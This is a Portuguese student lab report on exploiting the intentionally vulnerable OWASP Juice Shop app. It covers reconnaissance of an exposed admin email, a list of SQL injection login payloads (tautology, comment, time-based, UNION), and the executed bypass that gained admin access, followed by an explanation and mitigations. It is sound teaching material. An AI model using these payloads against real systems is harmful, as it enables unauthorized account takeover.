# 🔍 Exploração de Vulnerabilidade — 👨‍🔬 Testes Juice Lab

## 🔗 Matéria: Segurança Ofensiva 📕

- 👨‍🏫 **Professor:** JPGress  
- 🔍 **Tipo de atividade:** OSINT (OWASP TOP 1 2017)  
- 🧾 **Ferramenta:** OWASP Juice Shop (ambiente intencionalmente vulnerável)

---
## Após clonar e iniciar o Juice Shop, acessamos a aplicação localmente em:
```
http://127.0.0.1:3000
```
- Abrimos a página inicial para coleta de informações (reconhecimento) e identificamos potenciais pontos de entrada, como avaliações de produtos que expõem e-mails.

<img width="1600" height="899" alt="image" src="https://github.com/user-attachments/assets/7693ae64-6380-4375-8b37-944afc223775" />

---

## 🧭 Reconhecimento (OSINT)
- Ao clicar nos produtos ("sucos") encontramos comentários/avaliações que contêm o e-mail de um avaliador. Essas informações ajudam a montar testes focados em autenticação, já que o site solicita **e-mail** no login (em vez de nome de usuário).

<p align="center">
  <img width="496" height="482" alt="image" src="https://github.com/user-attachments/assets/7090facd-8d07-40e9-8c37-969933d7d49f" />
</p>

<p align="center">
  <img width="497" height="489" alt="image" src="https://github.com/user-attachments/assets/bed62948-3c9f-48a1-9e17-3ea984cc9434" />
</p>

- Exemplo de e-mail identificado:
> `admin@juice-sh.op`

---

## 🧪 Estratégia de teste — Injeção SQL (autenticação)
- Como a aplicação aceita e-mail no campo de login, podemos testar payloads de **SQL Injection** na etapa de autenticação. A ideia é verificar se a entrada do usuário é concatenada em uma query SQL sem a devida sanitização/parametrização, permitindo bypass da senha.

#### Payloads comuns para testar (exemplos)
- 1. Comentário para truncar a query:
```
Username: admin' --
Password: qualquer_coisa
```

- 2. Condição sempre verdadeira (bypass):
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

- 3. Time-based (teste de blind SQLi):
```
Username: admin' AND SLEEP(5) --
Password: qualquer_coisa
```

- 4. UNION-based (extração de dados — depende da query original):
```
Username: ' UNION SELECT 1,'admin','hashed_password' --
Password: qualquer_coisa
```

---

### ✅ Teste executado (simples e efetivo)
- No Juice Shop, realizamos o teste mais simples (bypass) que já é suficiente para autenticar como administrador.

**Entrada usada no campo “Username / Email”:**
```
admin@juice-sh.op' OR 1=1--
```
**Password:** qualquer valor

<p align="center">
  <img width="397" height="562" alt="image" src="https://github.com/user-attachments/assets/aae66f3d-069c-4394-8e91-bcc69309a8c5" />
</p>
Imagens do fluxo (exemplos de screenshots inseridos no relatório original)

Resultado: conseguimos acesso com privilégios de administrador.
<p align="center">
  <img width="284" height="264" alt="image" src="https://github.com/user-attachments/assets/23f56174-0af5-496a-94d7-779f7a4dd172" />
</p>
<p align="center">
  <img width="1600" height="900" alt="image" src="https://github.com/user-attachments/assets/f53213b7-b3e4-467e-8390-973416cb9d7f" />
</p>

---

### 💡 Explicação técnica (por que funciona)
O payload `OR 1=1 --` transforma a condição de verificação do usuário em algo sempre verdadeiro. Se a aplicação constrói a query de autenticação sem uso de parâmetros, por exemplo:
```sql
SELECT * FROM users WHERE email = 'admin@juice-sh.op' OR 1=1 --' AND password = '...';
```
o `OR 1=1` faz com que a cláusula WHERE seja satisfeita independentemente da senha. O `--` comenta o restante da query, ignorando a verificação de senha.

---

### 🔐 Mitigações recomendadas
1. **Use consultas parametrizadas / prepared statements** — evite concatenar entradas do usuário em queries SQL.  
2. **Valide e sanitize entradas** no servidor (white-list quando possível).  
3. **Limite tentativas de login** (rate limiting / account lockout).  
4. **Autenticação multifator (MFA)** para contas sensíveis.  
5. **Logs e monitoramento** de tentativas suspeitas.  
6. **Testes de segurança contínuos** em ambientes controlados (CTFs, Juice Shop, WebGoat).

---

### ⚖️ Nota ética e legal
Este relatório descreve testes realizados em um ambiente **controlado e intencionalmente vulnerável** (OWASP Juice Shop). **Nunca execute** testes de intrusão em sistemas sem autorização explícita. Práticas de segurança ofensiva devem sempre respeitar a legalidade e a ética profissional (responsible disclosure).
